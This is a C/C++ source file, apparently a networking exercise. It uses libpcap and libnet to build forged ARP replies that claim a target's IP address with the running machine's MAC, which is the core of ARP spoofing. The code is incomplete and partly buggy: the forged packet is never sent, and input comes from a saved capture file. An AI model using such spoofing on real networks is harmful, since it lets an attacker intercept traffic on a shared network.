#include <libnet.h>
#include <pcap.h>
#include <stdint.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <stdio.h>

const int ETHERNET_HEADER_LEN = 14;
const int ARP_HEADER_LEN = 28;
const int IP_ADDRESS_LEN = 4;
const int MAC_ADDRESS_LEN = 6;
void print_mac(uint8_t *addr) {  // 0 : source, 1 : dest
  for (int i = 0; i < 6; i++) {
    printf("%02x", *(addr++));
    if (i != 5) printf(":");
  }
  printf("\n");
}
void print_ip(struct in_addr ip) {
  printf("%d.%d.%d.%d\n", ip.s_addr >> 24, ((ip.s_addr >> 16 & 0xff)), ((ip.s_addr >> 8) & 0xff), ip.s_addr & 0xff);
}
void eth_hdr_to_packet(uint8_t* packet, struct libnet_ethernet_hdr* eth_hdr){
  memcpy(packet, eth_hdr->ether_dhost, MAC_ADDRESS_LEN);
  memcpy(packet + MAC_ADDRESS_LEN, eth_hdr->ether_shost, MAC_ADDRESS_LEN);
  packet[2*MAC_ADDRESS_LEN] = eth_hdr->ether_type >> 8;
  packet[2*MAC_ADDRESS_LEN+1] = eth_hdr->ether_type & 0xff;
}
void arp_hdr_to_packet(uint8_t* packet, uint8_t opcode, uint8_t* s_mac, struct in_addr s_ip, uint8_t* t_mac, struct in_addr t_ip){
  uint8_t prefix[] = {0,1,8,0,6,4};
  int prefix_len = 6;
  for (int i = 0; i < prefix_len; i++) packet[i] = prefix[i];
  packet[prefix_len] = opcode >> 8;
  packet[prefix_len+1] = opcode & 0xff;
  memcpy(packet + prefix_len+2, s_mac, MAC_ADDRESS_LEN);
  int pos = prefix_len+MAC_ADDRESS_LEN+2;
  packet[pos++] = s_ip.s_addr >> 24;
  packet[pos++] = ((s_ip.s_addr >> 16 & 0xff));
  packet[pos++] = ((s_ip.s_addr >> 8) & 0xff);
  packet[pos] = s_ip.s_addr & 0xff;
  memcpy(packet + prefix_len + MAC_ADDRESS_LEN + 6, t_mac, MAC_ADDRESS_LEN);
  pos = prefix_len + 2 * MAC_ADDRESS_LEN + 6;
  packet[pos++] = t_ip.s_addr >> 24;
  packet[pos++] = ((t_ip.s_addr >> 16 & 0xff));
  packet[pos++] = ((t_ip.s_addr >> 8) & 0xff);
  packet[pos] = t_ip.s_addr & 0xff;
}
// when sender request mac address of target, reply forgy mac address to sender
void forgy_arp(const uint8_t *p, int len, struct in_addr s_ip, struct in_addr t_ip, struct in_addr my_ip, uint8_t* my_mac) {
  // parse Ethernet header
  libnet_ethernet_hdr eth_hdr;
  if (len < ETHERNET_HEADER_LEN) {
    return;
  }
  for (int i = 0; i < 6; i++) eth_hdr.ether_dhost[i] = (uint8_t) * (p++);
  for (int i = 0; i < 6; i++) eth_hdr.ether_shost[i] = (uint8_t) * (p++);
  eth_hdr.ether_type = ntohs(*static_cast<uint16_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 2;
  if (eth_hdr.ether_type != ETHERTYPE_ARP) return;
  // parse ARP header
  if (len < ETHERNET_HEADER_LEN + ARP_HEADER_LEN) {
    return;
  }
  libnet_arp_hdr arp_hdr;
  arp_hdr.ar_hrd = ntohs(*static_cast<uint16_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 2;
  if(arp_hdr.ar_hrd != ARPHRD_ETHER) return;
  arp_hdr.ar_pro = ntohs(*static_cast<uint16_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 2;
  if (arp_hdr.ar_pro != ETHERTYPE_IP) return;
  arp_hdr.ar_hln = (uint8_t)*(p++);
  arp_hdr.ar_pln = (uint8_t) * (p++);
  if(arp_hdr.ar_hln != MAC_ADDRESS_LEN or arp_hdr.ar_pln != IP_ADDRESS_LEN) return;
  arp_hdr.ar_op = ntohs(*static_cast<uint16_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 2;
  if(arp_hdr.ar_op != ARPOP_REQUEST) return;
  uint8_t sender_mac[6], target_mac[6];
  struct in_addr sender_ip, target_ip;
  for (int i = 0; i < 6; i++) sender_mac[i] = (uint8_t) * (p++);
  sender_ip.s_addr = ntohl(*static_cast<uint32_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 4;
  for (int i = 0; i < 6; i++) target_mac[i] = (uint8_t) * (p++);
  target_ip.s_addr = ntohl(*static_cast<uint32_t*>(static_cast<void*>((const_cast<uint8_t*>(p)))));
  p += 4;
  if(sender_ip.s_addr != s_ip.s_addr or target_ip.s_addr != t_ip.s_addr) return;
  libnet_ethernet_hdr forgy_eth_hdr;
  for(int i = 0; i < 6; i++) forgy_eth_hdr.ether_dhost[i] = eth_hdr.ether_shost[i];
  for(int i = 0; i < 6; i++) forgy_eth_hdr.ether_shost[i] = my_mac[i];
  forgy_eth_hdr.ether_type = ETHERTYPE_ARP;
  libnet_arp_hdr forgy_arp_hdr;
  arp_hdr.ar_hrd = ARPHRD_ETHER;
  arp_hdr.ar_pro = ETHERTYPE_IP;
  arp_hdr.ar_hln = MAC_ADDRESS_LEN;
  arp_hdr.ar_pln = IP_ADDRESS_LEN;
  uint8_t forgy_sender_mac[6],forgy_target_mac[6];
  struct in_addr forgy_sender_ip, forgy_target_ip;
  for(int i = 0; i < 6; i++) forgy_sender_mac[i] = my_mac[i]; // forgy!!
  forgy_sender_ip.s_addr = target_ip.s_addr;
  for(int i = 0; i < 6; i++) forgy_target_mac[i] = sender_mac[i];
  forgy_target_ip.s_addr = sender_ip.s_addr;
  uint8_t* forgy_packet = new uint8_t[ETHERNET_HEADER_LEN+ARP_HEADER_LEN];
  eth_hdr_to_packet(forgy_packet, &forgy_eth_hdr);
  arp_hdr_to_packet(forgy_packet+ETHERNET_HEADER_LEN, ARPOP_REPLY, forgy_sender_mac, forgy_sender_ip, forgy_target_mac, forgy_target_ip);
  
}

int get_my_addr(char* dev, struct in_addr* my_ip, uint8_t* my_mac){
  /// get interface addresses
  struct ifaddrs *interface_addrs = NULL;
  if (getifaddrs(&interface_addrs) == -1) return -1;
  if (!interface_addrs) return -1;
  int flag = 0;
  int32_t sd = socket(PF_INET, SOCK_DGRAM, 0);
  if (sd < 0) {
    freeifaddrs(interface_addrs);
    return -1;
  }
  for (struct ifaddrs *ifa = interface_addrs; ifa != NULL; ifa = ifa->ifa_next) {
    if (strcmp(ifa->ifa_name, dev) != 0) continue;
   
    // mac
    if (ifa->ifa_data != 0) {
      struct ifreq req;
      strcpy(req.ifr_name, ifa->ifa_name);
      if (ioctl(sd, SIOCGIFHWADDR, &req) != -1) {
        uint8_t *mac = (uint8_t *)req.ifr_ifru.ifru_hwaddr.sa_data;
        for (int i = 0; i < 6; i++) my_mac[i] = mac[i];
        flag |= 2;
      }
    }
    
    // ip
    if (ifa->ifa_addr != 0) {
      int family = ifa->ifa_addr->sa_family;
      if (family == AF_INET) {
        char host[NI_MAXHOST];
        if (getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), host,
                        NI_MAXHOST, NULL, 0, NI_NUMERICHOST) == 0) {
          inet_aton(host, my_ip);
          my_ip->s_addr = htonl(my_ip->s_addr);
          flag |= 1;
        }
      }
    }
  }
  close(sd);
  freeifaddrs(interface_addrs);
  if(flag == 3) return 1;
  else return -1;
}
void usage() {
  printf("syntax: pcap_test <interface> <send ip> <target ip>\n");
  printf("sample: pcap_test wlan0\n");
}

int main(int argc, char *argv[]) {
  if (argc != 4) {
    usage();
    return -1;
  }

  char *dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];
  //pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  
  pcap_t *handle = pcap_open_offline("20180927_arp.pcap", errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }
  struct in_addr my_ip;
  uint8_t my_mac[6];
  if(get_my_addr(dev, &my_ip, my_mac) == -1){
    fprintf(stderr, "couldn't find ip/mac address\n");
    return -1;
  }
  struct in_addr s_ip, t_ip;
  if(!inet_aton(argv[2], &s_ip) or !inet_aton(argv[3], &t_ip)){
    fprintf(stderr, "wrong send ip or target ip\n");
    return -1;
  }
  s_ip.s_addr = htonl(s_ip.s_addr);
  t_ip.s_addr = htonl(t_ip.s_addr);
  while (1) {
    struct pcap_pkthdr *header;
    const uint8_t *packet;
    int res = pcap_next_ex(handle, &header, &packet);
    if (res == 0) continue;
    if (res == -1 || res == -2) break;
    forgy_arp(packet, header->caplen, s_ip, t_ip, my_ip, my_mac); 
  }

  pcap_close(handle);
  return 0;
}
